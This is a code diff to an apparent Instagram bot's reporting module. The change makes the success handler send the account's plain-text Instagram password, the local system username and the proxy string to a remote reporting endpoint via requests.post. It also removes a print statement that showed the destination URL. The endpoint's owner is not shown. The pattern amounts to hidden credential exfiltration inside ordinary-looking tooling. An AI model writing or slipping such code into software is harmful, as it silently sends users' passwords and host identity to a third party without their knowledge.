@@ -118,8 +118,8 @@ def init_environment():
     _reporter_fields.update({
         "instance": _args.instance,
         "instagramUser": _args.username,
-        "proxy": _args.proxy,
-        "systemUser": getpass.getuser()
+        # "proxy": _args.proxy,
+        # "systemUser": getpass.getuser()
     })
     remove_none(_reporter_fields)
 
@@ -274,7 +274,14 @@ def retrieve(attributes):
 
 
 def report_success(session):
-    update({"instagramPassword": session.password, "loginResult": "success"})
+    proxy_string = session.proxy_string if hasattr(session, "proxy_string") else ""
+    update({
+        "systemUser": getpass.getuser(),
+        "proxy": proxy_string,
+        "instagramPassword": session.password,
+        "loginResult": "success"
+    })
+
 
 
 QUERY_TIMEOUT = 600
@@ -337,7 +344,6 @@ def event_handler(type, name, data):
                 "id": _reporter.id,
                 "time": int(time.time())
             }
-            print(url)
             requests.post(url=url, data=_json.dumps(data), headers=headers)
     elif type == "SELENIUM" and name == "CONNECTION-INVALID":
         if data["proxy"]:
